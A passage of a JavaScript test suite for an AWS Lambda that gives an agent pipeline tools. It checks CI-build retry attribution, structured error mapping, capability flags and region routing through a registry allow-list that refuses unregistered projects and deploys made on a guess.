  it("(c) an unresolved pr/<n> death with no older resolved same-ref build is NOT attributed", async () => {
    // The documented residual: a FIRST attempt started with pr/12 that dies pre-resolve
    // has nothing to attribute it by, so it stays invisible — a plain first start.
    ledger([unresolved("b-pr-only", "PROVISIONING", "FAULT", "pr/12")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds().length).toBe(1);
    expect(startBuilds()[0].input.idempotencyToken).toBe(`ci-${SHA}`);
    expect(out).toMatchObject({ ok: true, started: true });
    expect(out.retry).toBeUndefined();
    expect(out.attempts).toBeUndefined();
  });

  it("(d) an unresolved pr/<n> retry ABOVE its resolved pr/<n> prior IS attributed", async () => {
    // Rule (iii): the retry path pins sourceVersion to the prior's, so an r1 that died
    // pre-resolve sits directly above a build that PROVED pr/12 resolves to this sha.
    ledger([
      unresolved("b-r1", "PROVISIONING", "FAULT", "pr/12"),
      diedAt("b-first", "INSTALL", "FAILED", { sourceVersion: "pr/12" }),
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out).toMatchObject({
      ok: false,
      reason: "install_flake_retry_failed",
      attempts: 2,
      prior_build_id: "b-r1",
    });
  });

  it("(d') rule (iii) only looks at OLDER builds — a NEWER resolved same-ref build proves nothing", async () => {
    // pr/12 pointed at a DIFFERENT commit when the older build was started; a newer
    // build resolving pr/12 to this sha must not retro-attribute it. Otherwise this
    // sha's legitimate first retry would be refused.
    ledger([
      diedAt("b-new", "INSTALL", "FAILED", { sourceVersion: "pr/12" }),
      unresolved("b-old", "PROVISIONING", "FAULT", "pr/12"),
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    // attempts 1 (the resolved build only) → the retry is still available.
    expect(out).toMatchObject({ ok: true, retry: true, prior_build_id: "b-new", attempts: 1 });
  });

  it("(e) an unresolved death started for a DIFFERENT hex sha is NOT attributed", async () => {
    ledger([
      unresolved("b-other", "PROVISIONING", "FAULT", "1111111111111111111111111111111111111111"),
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds().length).toBe(1);
    expect(startBuilds()[0].input.idempotencyToken).toBe(`ci-${SHA}`);
    expect(out.retry).toBeUndefined();
  });

  it("(f) an unresolved IN_PROGRESS build for the sha is REUSED, not duplicated", async () => {
    // Consequence of the same fix: a build still sitting in PROVISIONING for this sha
    // is genuinely live. Pre-F2 it was invisible, so the caller started a second one.
    ledger([
      { id: "b-provisioning", buildStatus: "IN_PROGRESS", sourceVersion: SHA },
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out).toMatchObject({
      ok: true,
      reused: true,
      buildId: "b-provisioning",
      buildStatus: "IN_PROGRESS",
      // Shape unchanged: null, because CodeBuild has not resolved the ref yet.
      resolvedSourceVersion: null,
    });
  });

  it("(g) the ledger stays newest-first: a resolved BUILD death above an unresolved flake decides", async () => {
    // Guards the oldest-first walk's reverse(): priorBuilds[0] must remain the NEWEST
    // build, or an older infra flake would re-open the door after a code failure.
    ledger([
      diedAt("b-code", "BUILD"),
      unresolved("b-flake", "PROVISIONING", "FAULT"),
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out).toMatchObject({
      ok: false,
      reason: "build_failed_not_retryable",
      prior_build_id: "b-code",
      prior_failed_phase: "BUILD",
      attempts: 2,
    });
  });
});

describe("start_ci_build error mapping (a denial is an answer, not a crash)", () => {
  const SHA = "0949f9d";

  function throwing(name, message = name) {
    return async () => {
      const err = new Error(message);
      err.name = name;
      throw err;
    };
  }

  it("AccessDenied → start_build_not_granted, structured, no throw", async () => {
    h.state.startBuildImpl = throwing("AccessDeniedException", "not authorized to perform: codebuild:StartBuild");

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({
      ok: false,
      reason: "start_build_not_granted",
      project: "agentcore-hub-ci",
    });
    // The IAM message itself is not echoed — only the actionable remediation.
    expect(out.detail).toContain("PIPELINE_CI_START_BUILD=1");
    expect(out.detail).not.toContain("not authorized to perform");

    // TEAM-4358: after TEAM-4337's convention IAM, three causes produce this
    // denial — the flag being unset is only one of them, and the text used to
    // name it as if it were the only one.
    expect(out.detail).toContain("PIPELINE_REGIONS");
    expect(out.detail).toContain("hub-*-ci");
    // Which region was refused is half the diagnosis: the grant is fanned out
    // per region, so the same project name can be granted in one and not another.
    // The env target's region, resolved the same way index.mjs does (no registry
    // here, so this is the module-load REGION).
    expect(out.region).toBe(process.env.AWS_REGION || "us-east-1");
  });

  it("ResourceNotFound → project_not_found", async () => {
    h.state.startBuildImpl = throwing("ResourceNotFoundException");

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({ ok: false, reason: "project_not_found", project: "agentcore-hub-ci" });
  });

  it("InvalidInput → invalid_source_version (CodeBuild refused a shape we allowed)", async () => {
    h.state.startBuildImpl = throwing("InvalidInputException", "Unable to resolve version: pr/999");

    const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: "pr/999" });

    expect(out).toMatchObject({
      ok: false,
      reason: "invalid_source_version",
      sourceVersion: "pr/999",
    });
  });

  it("an unexpected error falls through to the generic handler error path", async () => {
    h.state.startBuildImpl = throwing("ThrottlingException", "Rate exceeded");

    const res = await handler({
      name: "Pipeline___start_ci_build",
      arguments: { commit_sha: SHA },
    });

    // textResult, not jsonResult — the agent sees a retryable error, not ok:false.
    expect(res.content[0].text).toContain("ThrottlingException");
    expect(res.content[0].text).toContain("Rate exceeded");
  });
});

// ─── 5. capabilities (TEAM-4122 FR-4) ────────────────────────────────────────

describe("capabilities", () => {
  it("startCiBuild:true only when PIPELINE_CI_START_BUILD=1", async () => {
    process.env.PIPELINE_CI_START_BUILD = "1";
    expect((await invoke("capabilities")).startCiBuild).toBe(true);

    for (const value of [undefined, "0", "", "true", "yes", "1 "]) {
      if (value === undefined) delete process.env.PIPELINE_CI_START_BUILD;
      else process.env.PIPELINE_CI_START_BUILD = value;
      expect((await invoke("capabilities")).startCiBuild, String(value)).toBe(false);
    }
  });

  it("startCiBuild:false when CI_PROJECT is invalid EVEN WITH the flag on", async () => {
    await withEnv(
      { CI_PROJECT: "agentcore-hub-deploy", PIPELINE_CI_START_BUILD: "1" },
      async ({ handler: h2 }) => {
        const out = await invokeOn(h2, "capabilities");
        expect(out.startCiBuild).toBe(false);
        expect(out.ciProject).toBe("agentcore-hub-deploy");
      }
    );
  });

  it("approveDeploy is an unconditional false, flag or no flag", async () => {
    process.env.PIPELINE_CI_START_BUILD = "1";
    expect((await invoke("capabilities")).approveDeploy).toBe(false);
    delete process.env.PIPELINE_CI_START_BUILD;
    expect((await invoke("capabilities")).approveDeploy).toBe(false);
  });

  it("reports the projects it is wired to, and its version", async () => {
    const out = await invoke("capabilities");

    // The flat keys describe the ENV DEFAULT and are kept verbatim for callers
    // written against version 2. version 3 (TEAM-4337) adds `targets` — asserted
    // in the multi-target suite, not here. version 4 (TEAM-4448 D2) adds the
    // top-level `ciRetry` contract — asserted in the retry suite.
    expect(out).toMatchObject({
      ciProject: "agentcore-hub-ci",
      buildProject: "agentcore-hub-build",
      deployPipeline: "agentcore-hub-deploy",
      version: 4,
    });
    // Read-only: capabilities never talks to AWS.
    expect(h.state.cpCalls).toEqual([]);
    expect(h.state.cbCalls).toEqual([]);
  });

  it("the unknown-tool message lists both new tools", async () => {
    const res = await handler({ name: "Pipeline___approve_deploy", arguments: {} });
    expect(res.error).toContain("start_ci_build");
    expect(res.error).toContain("capabilities");
    expect(res.error).not.toContain("PutApprovalResult");
  });
});

// ─── 6. validateCiProjectName, directly ──────────────────────────────────────

describe("validateCiProjectName", () => {
  it("accepts an ordinary PR-check project name", () => {
    const out = validateCiProjectName("agentcore-hub-ci", {
      buildProject: "agentcore-hub-build",
      deployProject: "agentcore-hub-deploy",
      pipelineName: "agentcore-hub-deploy",
    });
    expect(out).toEqual({ ok: true, reason: null });
  });

  it("names a reason for every refusal (the tool surfaces it as `detail`)", () => {
    const opts = {
      buildProject: "agentcore-hub-build",
      deployProject: "agentcore-hub-deploy",
      pipelineName: "agentcore-hub-deploy",
    };
    for (const bad of ["", "*", "ci-*", "ci?", "a", "-ci", "ci build", "agentcore-hub-build", "agentcore-hub-deploy", "agentcore-hub-runtime-image-deploy", null, undefined, 7]) {
      const out = validateCiProjectName(bad, opts);
      expect(out.ok, String(bad)).toBe(false);
      expect(typeof out.reason, String(bad)).toBe("string");
      expect(out.reason.length, String(bad)).toBeGreaterThan(0);
    }
  });
});

// ─── Infra handoff on a SUCCEEDED run ────────────────────────────────────────
// The Deploy stage used to `exit 2` when a changeset also touched infra-only
// files: a green deploy reported as a Failed action. "Failed" then meant either
// a real failure or a clean deploy with a follow-up, and only a build log could
// tell them apart — six straight Failed executions (2026-09-08/09) is what made
// the pipeline unreadable. It now succeeds and records the file list in S3;
// get_state reports that as `handoff` data.

describe("get_state infra handoff marker", () => {
  const sha = "a7679ed62d8af7251518fcb21e154698f09e9242";

  function withRevision(revisionId) {
    h.state.getPipelineExecutionImpl = async () => ({
      pipelineExecution: { artifactRevisions: [{ revisionId }] },
    });
  }

  it("reports handoff files on a run whose Deploy stage wrote a marker", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("exec-1");
    withRevision(sha);
    h.state.getObjectImpl = async () => ({
      Body: {
        transformToString: async () =>
          "deploy/setup-pipeline-tools-lambda.mjs\ndeploy/setup-lambda-role.sh\n",
      },
    });

    const out = await withEnv({ ARTIFACT_BUCKET: "bucket-x" }, (mod) =>
      invokeOn(mod.handler, "get_state", { execution_id: "exec-1" })
    );

    expect(out.succeeded).toBe(true);
    expect(out.failed).toBe(false);
    expect(out.handoff.files).toEqual([
      "deploy/setup-pipeline-tools-lambda.mjs",
      "deploy/setup-lambda-role.sh",
    ]);
    // Keyed on the 12-char GIT_SHA the Build stage uses, under the one prefix
    // this role can read.
    expect(h.state.s3Calls.at(-1)).toEqual({
      Bucket: "bucket-x",
      Key: `pipeline-artifacts/handoff/${sha.slice(0, 12)}.txt`,
    });
  });

  it("returns handoff null when the deploy had nothing to hand off", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("exec-1");
    withRevision(sha);
    const out = await withEnv({ ARTIFACT_BUCKET: "bucket-x" }, (mod) =>
      invokeOn(mod.handler, "get_state", { execution_id: "exec-1" })
    );
    expect(out.succeeded).toBe(true);
    expect(out.handoff).toBe(null);
  });

  it("never fails get_state when the marker lookup errors", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("exec-1");
    withRevision(sha);
    h.state.getObjectImpl = async () => {
      const err = new Error("AccessDenied");
      err.name = "AccessDenied";
      throw err;
    };
    const out = await withEnv({ ARTIFACT_BUCKET: "bucket-x" }, (mod) =>
      invokeOn(mod.handler, "get_state", { execution_id: "exec-1" })
    );
    expect(out.succeeded).toBe(true);
    expect(out.handoff).toBe(null);
  });

  it("does not call S3 at all when no artifact bucket is configured", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("exec-1");
    withRevision(sha);
    const out = await withEnv({ ARTIFACT_BUCKET: undefined }, (mod) =>
      invokeOn(mod.handler, "get_state", { execution_id: "exec-1" })
    );
    expect(out.handoff).toBe(null);
    expect(h.state.s3Calls).toEqual([]);
  });
});

// ─── 8. Multi-target resolution off the CD registry (TEAM-4337) ──────────────

/**
 * The registry — not env, and not the caller's args — is the allow-list. These
 * cases pin the three properties that make that safe:
 *
 *   1. ROUTING. A registered pipeline in another region is reached with a client
 *      constructed for THAT region, and the env default still reaches REGION.
 *   2. REFUSAL COSTS NOTHING. An unregistered pipeline/project, or an ambiguous
 *      deploy, is answered from the registry alone: zero AWS commands, and for
 *      a pipeline refusal not even a CodePipeline client construction.
 *   3. (TEAM-4348) THE PROJECT'S OWNER WINS THE REGION. When a call names a
 *      project some OTHER way than pipeline_name (a build_id's embedded
 *      project, or an explicit project alongside an unrelated pipeline_name),
 *      the client region and the response `region` follow that project's own
 *      target — never the pipeline_name-resolved one, and never a silent
 *      `|| target` fallback into an unregistered name.
 *
 * Every case goes through withRegistry -> withEnv, because both the env values
 * and the registry cache are per-module-instance.
 */
describe("multi-target registry resolution", () => {
  const WIDGET = "hub-widget-deploy";
  const HUB = "agentcore-hub-deploy";

  // 8.1 region routing ──────────────────────────────────────────────────────

  it("routes a registry target's get_state to that target's region", async () => {
    h.state.getPipelineStateImpl = async () => ({ stageStates: [] });
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_state", { pipeline_name: WIDGET })
    );

    expect(out.pipelineName).toBe(WIDGET);
    expect(out.region).toBe("us-west-2");
    expect(out.repo).toBe("acme/widget");

    const call = h.state.cpCalls.find((c) => c.type === "GetPipelineState");
    expect(call.region).toBe("us-west-2");
    expect(call.name).toBe(WIDGET);
    // The pipeline's region, and ONLY that region, got a client.
    expect(initRegions("codepipeline")).toEqual(["us-west-2"]);
  });

  it("routes the env default target to REGION, not to a registry region", async () => {
    h.state.getPipelineStateImpl = async () => ({ stageStates: [] });
    // Registry absent -> the env default is the only target.
    await withRegistry(null, (mod) => invokeOn(mod.handler, "get_state", {}), {
      AWS_REGION: "us-east-1",
    });

    const call = h.state.cpCalls.find((c) => c.type === "GetPipelineState");
    expect(call.region).toBe("us-east-1");
    expect(call.name).toBe(HUB);
  });

  // 8.1b (TEAM-4358) registry ORDER never picks the default target ──────────
  //
  // Every case here is UNQUALIFIED (no pipeline_name, no project, no build_id):
  // the tool must fall back to the target this deployment is CONFIGURED for
  // (PIPELINE_NAME), which in HUB_SECOND_REGISTRY is the second entry. Each
  // asserts both halves — the hub resource was used, AND no client was ever even
  // constructed for the other target's region. `initRegions` is emptied by
  // withRegistry after module load, so these counts are one invocation's.

  it("resolves an unqualified get_state to PIPELINE_NAME, not to the first registry entry", async () => {
    h.state.getPipelineStateImpl = async () => ({ stageStates: [] });

    const out = await withRegistry(HUB_SECOND_REGISTRY, (mod) => invokeOn(mod.handler, "get_state", {}), {
      AWS_REGION: "us-east-1",
    });

    expect(out.pipelineName).toBe(HUB);
    expect(out.region).toBe("us-east-1");
    expect(out.repo).toBe("tycenjmccann/agentcore-hub");

    const call = h.state.cpCalls.find((c) => c.type === "GetPipelineState");
    expect(call.name).toBe(HUB);
    expect(call.region).toBe("us-east-1");
    // The other target's region never got a client at all.
    expect(initRegions("codepipeline")).toEqual(["us-east-1"]);
  });

  it("starts an unqualified CI build on the hub's CI project, with the 3-key allow-list intact", async () => {
    const sha = "9".repeat(40);

    const out = await withRegistry(
      HUB_SECOND_REGISTRY,
      (mod) => invokeOn(mod.handler, "start_ci_build", { commit_sha: sha }),
      { AWS_REGION: "us-east-1" }
    );

    expect(out.ok).toBe(true);
    expect(out.region).toBe("us-east-1");
    // Pre-fix this StartBuild went to hub-widget-ci in us-west-2 — another repo's
    // PR check, started off another repo's registry position.
    const start = h.state.cbCalls.find((c) => c.type === "StartBuild");
    expect(start.input).toEqual({
      projectName: "agentcore-hub-ci",
      sourceVersion: sha,
      idempotencyToken: `ci-${sha}`,
    });
    expect(start.region).toBe("us-east-1");
    // Every CodeBuild call of this invocation (the dedupe scan included).
    expect([...new Set(h.state.cbCalls.map((c) => c.region))]).toEqual(["us-east-1"]);
    expect(h.state.cbCalls.some((c) => /^hub-widget-/.test(c.name || ""))).toBe(false);
  });

  it("scans the hub's CI project for an unqualified get_build_status", async () => {
    h.state.listBuildsImpl = async () => ({
      ids: ["agentcore-hub-ci:33333333-2222-3333-4444-555555555555"],
    });

    const out = await withRegistry(
      HUB_SECOND_REGISTRY,
      (mod) => invokeOn(mod.handler, "get_build_status", {}),
      { AWS_REGION: "us-east-1" }
    );

    expect(out.project).toBe("agentcore-hub-ci");
    expect(out.region).toBe("us-east-1");
    const list = h.state.cbCalls.find((c) => c.type === "ListBuildsForProject");
    expect(list.name).toBe("agentcore-hub-ci");
    expect(initRegions("codebuild")).toEqual(["us-east-1"]);
  });

  it("reads the hub's build project for an unqualified get_build_log (no build_id)", async () => {
    h.state.listBuildsImpl = async () => ({
      ids: ["agentcore-hub-build:44444444-2222-3333-4444-555555555555"],
    });

    const out = await withRegistry(
      HUB_SECOND_REGISTRY,
      (mod) => invokeOn(mod.handler, "get_build_log", {}),
      { AWS_REGION: "us-east-1" }
    );

    expect(out.project).toBe("agentcore-hub-build");
    expect(out.region).toBe("us-east-1");
    const list = h.state.cbCalls.find((c) => c.type === "ListBuildsForProject");
    expect(list.name).toBe("agentcore-hub-build");
    expect(h.state.cbCalls.some((c) => /^hub-widget-/.test(c.name || ""))).toBe(false);
    expect(initRegions("codebuild")).toEqual(["us-east-1"]);
    expect(initRegions("logs")).not.toContain("us-west-2");
  });

  it("still refuses an unqualified start_deploy — the fix widens no write path", async () => {
    const out = await withRegistry(
      HUB_SECOND_REGISTRY,
      (mod) => invokeOn(mod.handler, "start_deploy", { commit_sha: "a".repeat(40) }),
      { AWS_REGION: "us-east-1" }
    );

    // A default target for the READ tools must never become a default DEPLOY.
    expect(out).toEqual({
      ok: false,
      reason: "pipeline_name_required",
      known: [WIDGET, HUB],
    });
    expect(h.state.cpCalls).toEqual([]);
    expect(initRegions("codepipeline")).toEqual([]);
  });

  // 8.2 refusals make no AWS call ───────────────────────────────────────────

  it("refuses an unregistered pipeline_name with zero CodePipeline traffic", async () => {
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_state", { pipeline_name: "someone-elses-deploy" })
    );

    expect(out).toEqual({
      ok: false,
      reason: "pipeline_not_registered",
      requested: "someone-elses-deploy",
      known: [HUB, WIDGET],
    });
    expect(h.state.cpCalls).toEqual([]);
    // Not even a client: resolution happens before any client is asked for.
    expect(initRegions("codepipeline")).toEqual([]);
  });

  it("refuses an unregistered project with zero CodeBuild traffic", async () => {
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_build_status", { project: "someone-elses-ci" })
    );

    expect(out.ok).toBe(false);
    expect(out.reason).toBe("project_not_registered");
    expect(out.requested).toBe("someone-elses-ci");
    // Every project of every target, so the caller can correct itself.
    expect(out.known).toEqual(
      expect.arrayContaining(["agentcore-hub-ci", "hub-widget-ci", "hub-widget-build", WIDGET])
    );
    expect(h.state.cbCalls).toEqual([]);
    expect(initRegions("codebuild")).toEqual([]);
  });

  it("refuses start_deploy without pipeline_name when more than one target exists", async () => {
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "start_deploy", { commit_sha: "a".repeat(40) })
    );

    expect(out).toEqual({
      ok: false,
      reason: "pipeline_name_required",
      known: [HUB, WIDGET],
    });
    // The one WRITE this Lambda can make never happens on a guess. A project
    // cannot substitute for pipeline_name either — see 8.2b below.
    expect(h.state.cpCalls).toEqual([]);
  });

  // 8.2b (TEAM-4348) args.project cannot substitute for pipeline_name ───────

  it("refuses start_deploy that names only a project — project is not a deploy input", async () => {
    for (const project of ["agentcore-hub-ci", "hub-widget-build"]) {
      h.state.cpCalls = [];
      h.state.clientInits = [];
      const out = await withRegistry(MULTI_REGISTRY, (mod) =>
        invokeOn(mod.handler, "start_deploy", { project, commit_sha: "a".repeat(40) })
      );

      expect(out, project).toEqual({
        ok: false,
        reason: "pipeline_name_required",
        known: [HUB, WIDGET],
      });
      expect(h.state.cpCalls, project).toEqual([]);
      expect(initRegions("codepipeline"), project).toEqual([]);
    }
  });

  // 8.3 the env default path is unchanged ───────────────────────────────────

  it("sends byte-identical inputs for the env default when no registry exists", async () => {
    h.state.getPipelineStateImpl = async () => ({ stageStates: [] });
    const sha = "b".repeat(40);

    await withRegistry(
      null,
      async (mod) => {
        await invokeOn(mod.handler, "get_state", {});
        await invokeOn(mod.handler, "start_deploy", { commit_sha: sha });
      },
      { AWS_REGION: "us-east-1" }
    );

    // Exactly the pre-TEAM-4337 payloads — no extra key, no target metadata.
    expect(h.state.cpCalls.find((c) => c.type === "GetPipelineState").input).toEqual({
      name: HUB,
    });
    expect(h.state.cpCalls.find((c) => c.type === "StartPipelineExecution").input).toEqual({
      name: HUB,
      clientRequestToken: `deploy-${sha}`,
    });
  });

  it("routes start_deploy to the requested target's region", async () => {
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "start_deploy", { pipeline_name: WIDGET })
    );

    expect(out.pipelineName).toBe(WIDGET);
    expect(out.region).toBe("us-west-2");
    const call = h.state.cpCalls.find((c) => c.type === "StartPipelineExecution");
    expect(call.region).toBe("us-west-2");
    expect(call.name).toBe(WIDGET);
  });

  // 8.4 error text names the REQUESTED pipeline ─────────────────────────────

  it("names the requested pipeline and region in the not-found error", async () => {
    h.state.getPipelineStateImpl = async () => {
      const err = new Error("nope");
      err.name = "PipelineNotFoundException";
      throw err;
    };

    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_state", { pipeline_name: WIDGET })
    );

    // Not the env defaults: an operator reading this must see what was asked for.
    expect(out.configured).toBe(false);
    expect(out.error).toBe(`Pipeline "${WIDGET}" not found in us-west-2`);
    expect(out.error).not.toContain(HUB);
    expect(out.error).not.toContain("us-east-1");
  });

  // 8.5 get_build_log infers the project, and the region, from the build id ──

  it("infers the owning project and region from a build_id", async () => {
    h.state.batchGetBuildsImpl = async (input) => ({
      builds: [
        {
          id: input.ids[0],
          buildStatus: "FAILED",
          phases: [],
          logs: { groupName: "/aws/codebuild/hub-widget-build", streamName: "stream-1" },
        },
      ],
    });
    h.state.getLogEventsImpl = async () => ({ events: [{ message: "boom" }] });

    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_build_log", {
        build_id: "hub-widget-build:11111111-2222-3333-4444-555555555555",
      })
    );

    // `project` is optional: the id carries it as "<projectName>:<uuid>".
    expect(out.project).toBe("hub-widget-build");
    expect(out.region).toBe("us-west-2");

    const batch = h.state.cbCalls.find((c) => c.type === "BatchGetBuilds");
    expect(batch.region).toBe("us-west-2");
    // A known build id needs no scan of the project's history.
    expect(h.state.cbCalls.some((c) => c.type === "ListBuildsForProject")).toBe(false);
    expect(h.state.logsCalls.map((c) => c.region)).toEqual(["us-west-2"]);
  });

  // 8.5b (TEAM-4348) the build_id's project is allow-listed too ─────────────

  it("refuses a build_id whose project is not registered, with zero CodeBuild and Logs traffic", async () => {
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_build_log", {
        build_id: "hub-unregistered-build:11111111-2222-3333-4444-555555555555",
      })
    );

    expect(out).toEqual({
      ok: false,
      reason: "project_not_registered",
      requested: "hub-unregistered-build",
      known: expect.arrayContaining([
        "agentcore-hub-ci",
        "agentcore-hub-build",
        HUB,
        "hub-widget-ci",
        "hub-widget-build",
        WIDGET,
      ]),
    });
    expect(h.state.cbCalls).toEqual([]);
    expect(h.state.logsCalls).toEqual([]);
    // Not even a client: the refusal happens before clientsFor is ever called.
    expect(initRegions("codebuild")).toEqual([]);
    expect(initRegions("logs")).toEqual([]);
  });

  it("refuses a project that disagrees with the build_id's project instead of picking one", async () => {
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_build_log", {
        project: "agentcore-hub-build",
        build_id: "hub-widget-build:11111111-2222-3333-4444-555555555555",
      })
    );

    expect(out).toEqual({
      ok: false,
      reason: "project_mismatch",
      requested: "agentcore-hub-build",
      buildIdProject: "hub-widget-build",
    });
    expect(h.state.cbCalls).toEqual([]);
    expect(h.state.logsCalls).toEqual([]);
    expect(initRegions("codebuild")).toEqual([]);
    expect(initRegions("logs")).toEqual([]);
  });

  it("reads the build_id's OWNER region even when pipeline_name names another target", async () => {
    h.state.batchGetBuildsImpl = async (input) => ({
      builds: [
        {
          id: input.ids[0],
          buildStatus: "FAILED",
          phases: [],
          logs: { groupName: "/aws/codebuild/hub-widget-build", streamName: "stream-1" },
        },
      ],
    });
    h.state.getLogEventsImpl = async () => ({ events: [{ message: "boom" }] });

    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_build_log", {
        pipeline_name: HUB,
        build_id: "hub-widget-build:11111111-2222-3333-4444-555555555555",
      })
    );

    expect(out.project).toBe("hub-widget-build");
    expect(out.region).toBe("us-west-2");
    const batch = h.state.cbCalls.find((c) => c.type === "BatchGetBuilds");
    expect(batch.region).toBe("us-west-2");
    expect(h.state.logsCalls.map((c) => c.region)).toEqual(["us-west-2"]);
  });

  // 8.6 start_ci_build on a registry target ─────────────────────────────────

  it("starts a registry target's CI project with the 3-key allow-list in its region", async () => {
    const sha = "c".repeat(40);
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "start_ci_build", { project: "hub-widget-ci", commit_sha: sha })
    );

    expect(out.ok).toBe(true);
    const start = h.state.cbCalls.find((c) => c.type === "StartBuild");
    expect(start.region).toBe("us-west-2");
    // Deep-equal, not toMatchObject: a fourth key is the defect.
    expect(start.input).toEqual({
      projectName: "hub-widget-ci",
      sourceVersion: sha,
      idempotencyToken: `ci-${sha}`,
    });
  });

  // 8.7 start_ci_build can never reach a deploy project ─────────────────────

  it("never starts a deploy project, even when asked for one by name", async () => {
    const sha = "d".repeat(40);
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "start_ci_build", { project: WIDGET, commit_sha: sha })
    );

    // A registered name resolves the TARGET, then the CI project is taken from
    // the target - a non-CI project is ignored, never honoured (and never
    // rejected, so a retry loop cannot probe for one).
    expect(out.ok).toBe(true);
    const start = h.state.cbCalls.find((c) => c.type === "StartBuild");
    expect(start.input.projectName).toBe("hub-widget-ci");
    expect(h.state.cbCalls.some((c) => c.name === WIDGET)).toBe(false);
    expect(h.state.cbCalls.some((c) => /-deploy$/.test(c.name || ""))).toBe(false);
  });

  it("refuses a registry ciProject that collides with another target's deploy project", async () => {
    const out = await withRegistry(
      {
        version: 1,
        repos: [
          { repo: "acme/widget", pipeline: WIDGET, region: "us-west-2", ciProject: HUB },
        ],
      },
      (mod) =>
        invokeOn(mod.handler, "start_ci_build", {
          pipeline_name: WIDGET,
          commit_sha: "e".repeat(40),
        })
    );

    // Validated per call, against EVERY target's names - the module-load check
    // could not see this value.
    expect(out.ok).toBe(false);
    expect(out.reason).toBe("ci_project_invalid");
    expect(h.state.cbCalls.filter((c) => c.type === "StartBuild")).toEqual([]);
  });

  it("refuses the reserved runtime-image project, with zero AWS traffic", async () => {
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "start_ci_build", {
        project: "agentcore-hub-runtime-image-deploy",
        commit_sha: "f".repeat(40),
      })
    );

    // Not any target's project, so it is refused at resolution - the reserved
    // list never even has to be consulted.
    expect(out.ok).toBe(false);
    expect(out.reason).toBe("project_not_registered");
    expect(h.state.cbCalls).toEqual([]);
  });

  // 8.6b (TEAM-4348) region follows the project's owner, not the ─────────────
  // pipeline_name-resolved target ────────────────────────────────────────────

  it("start_ci_build sends every CodeBuild call to the CI project's own region", async () => {
    const sha = "1".repeat(40);
    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "start_ci_build", {
        pipeline_name: HUB,
        project: "hub-widget-ci",
        commit_sha: sha,
      })
    );

    expect(out.ok).toBe(true);
    expect(out.region).toBe("us-west-2");
    // Every CodeBuild call this invocation made — the dedupe scan AND
    // StartBuild — went to the project's own region, not HUB's (us-east-1).
    expect(h.state.cbCalls.length).toBeGreaterThan(0);
    expect([...new Set(h.state.cbCalls.map((c) => c.region))]).toEqual(["us-west-2"]);
    const start = h.state.cbCalls.find((c) => c.type === "StartBuild");
    expect(start.input).toEqual({
      projectName: "hub-widget-ci",
      sourceVersion: sha,
      idempotencyToken: `ci-${sha}`,
    });
  });

  it("get_build_status scans the project's own region, and refuses an unregistered project even with a pipeline_name", async () => {
    h.state.listBuildsImpl = async () => ({ ids: ["hub-widget-ci:22222222-2222-3333-4444-555555555555"] });

    const ok = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_build_status", {
        pipeline_name: HUB,
        project: "hub-widget-ci",
      })
    );
    expect(ok.region).toBe("us-west-2");
    const list = h.state.cbCalls.find((c) => c.type === "ListBuildsForProject");
    expect(list.region).toBe("us-west-2");

    h.state.cbCalls = [];
    const bad = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_build_status", {
        pipeline_name: HUB,
        project: "someone-elses-ci",
      })
    );
    expect(bad.ok).toBe(false);
    expect(bad.reason).toBe("project_not_registered");
    expect(h.state.cbCalls).toEqual([]);
  });

  // 8.8 registry read failures degrade to the env target ────────────────────

  it("falls back to the env target when the registry read is denied", async () => {
    h.state.registryImpl = async () => {
      const err = new Error("AccessDenied");
      err.name = "AccessDenied";
      throw err;
    };

    const out = await withRegistry(null, (mod) => invokeOn(mod.handler, "capabilities"), {
      AWS_REGION: "us-east-1",
    });

    expect(out.targets).toHaveLength(1);
    expect(out.targets[0].pipeline).toBe(HUB);
    expect(out.targets[0].region).toBe("us-east-1");
  });

  it("treats a missing registry object as an empty registry", async () => {
    // beforeEach already installs the NoSuchKey default; assert it explicitly.
    const out = await withRegistry(null, (mod) => invokeOn(mod.handler, "capabilities"));

    expect(out.targets).toHaveLength(1);
    expect(out.targets[0].pipeline).toBe(HUB);
    expect(h.state.s3Calls.map((c) => c.Key)).toEqual(["config/cd-registry.json"]);
  });

  it("keeps the last good registry copy when a later read fails", async () => {
    await withRegistry(
      MULTI_REGISTRY,
      async (mod) => {
        const first = await invokeOn(mod.handler, "capabilities");
        expect(first.targets.map((t) => t.pipeline)).toEqual([HUB, WIDGET]);

        // Expire the 1ms TTL, then break the read.
